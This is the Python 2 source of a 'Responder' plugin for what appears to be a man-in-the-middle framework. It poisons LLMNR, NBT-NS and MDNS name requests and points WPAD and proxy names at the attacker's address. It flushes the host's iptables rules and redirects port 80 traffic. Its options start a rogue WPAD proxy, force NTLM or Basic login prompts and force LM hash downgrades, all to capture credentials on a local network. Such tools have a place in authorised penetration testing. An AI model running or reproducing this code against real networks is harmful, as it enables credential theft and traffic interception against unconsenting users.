from plugins.plugin import Plugin
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  #Gets rid of IPV6 Error when importing scapy
from scapy.all import get_if_addr
from libs.responder.Responder import start_responder
from libs.sslstrip.DnsCache import DnsCache
import sys
import os
import threading

class Responder(Plugin):
    name = "Responder"
    optname = "responder"
    desc = "Poison LLMNR, NBT-NS and MDNS requests"
    #implements = ["handleResponse"]
    has_opts = True

    def initialize(self, options):
        '''Called if plugin is enabled, passed the options namespace'''
        self.options = options
        self.interface = options.interface

        if os.geteuid() != 0:
            sys.exit("[-] Responder plugin requires root privileges")

        try:
            config = options.configfile['Responder']
        except Exception, e:
            sys.exit('[-] Error parsing config for Responder: ' + str(e))

        try:
            self.ip_address = get_if_addr(options.interface)
            if self.ip_address == "0.0.0.0":
                sys.exit("[-] Interface %s does not have an IP address" % self.interface)
        except Exception, e:
            sys.exit("[-] Error retrieving interface IP address: %s" % e)

        print "[*] Responder plugin online"
        DnsCache.getInstance().setCustomAddress(self.ip_address)

        for name in ['wpad', 'ISAProxySrv', 'RespProxySrv']:
            DnsCache.getInstance().setCustomRes(name, self.ip_address)

        if '--spoof' not in sys.argv:
            print '[*] Setting up iptables'
            os.system('iptables -F && iptables -X && iptables -t nat -F && iptables -t nat -X')
            os.system('iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port %s' % options.listen)

        t = threading.Thread(name='responder', target=start_responder, args=(options, self.ip_address, config))
        t.setDaemon(True)
        t.start()

    def add_options(self, options):
        options.add_argument('--analyze', dest="Analyse", action="store_true", help="Allows you to see NBT-NS, BROWSER, LLMNR requests from which workstation to which workstation without poisoning")
        options.add_argument('--basic', dest="Basic", default=False, action="store_true", help="Set this if you want to return a Basic HTTP authentication. If not set, an NTLM authentication will be returned")
        options.add_argument('--wredir', dest="Wredirect", default=False, action="store_true", help="Set this to enable answers for netbios wredir suffix queries. Answering to wredir will likely break stuff on the network (like classics 'nbns spoofer' would). Default value is therefore set to False")
        options.add_argument('--nbtns', dest="NBTNSDomain", default=False, action="store_true", help="Set this to enable answers for netbios domain suffix queries. Answering to domain suffixes will likely break stuff on the network (like a classic 'nbns spoofer' would). Default value is therefore set to False")
        options.add_argument('--fingerprint', dest="Finger", default=False, action="store_true", help = "This option allows you to fingerprint a host that issued an NBT-NS or LLMNR query")
        options.add_argument('--wpad', dest="WPAD_On_Off", default=False, action="store_true", help = "Set this to start the WPAD rogue proxy server. Default value is False")
        options.add_argument('--forcewpadauth', dest="Force_WPAD_Auth", default=False, action="store_true", help = "Set this if you want to force NTLM/Basic authentication on wpad.dat file retrieval. This might cause a login prompt in some specific cases. Therefore, default value is False")
        options.add_argument('--lm', dest="LM_On_Off", default=False, action="store_true", help="Set this if you want to force LM hashing downgrade for Windows XP/2003 and earlier. Default value is False")
        options.add_argument('--verbose', dest="Verbose", default=False, action="store_true", help="More verbose")

    def finish(self):
        if '--spoof' not in sys.argv:
            print '\n[*] Flushing iptables'
            os.system('iptables -F && iptables -X && iptables -t nat -F && iptables -t nat -X')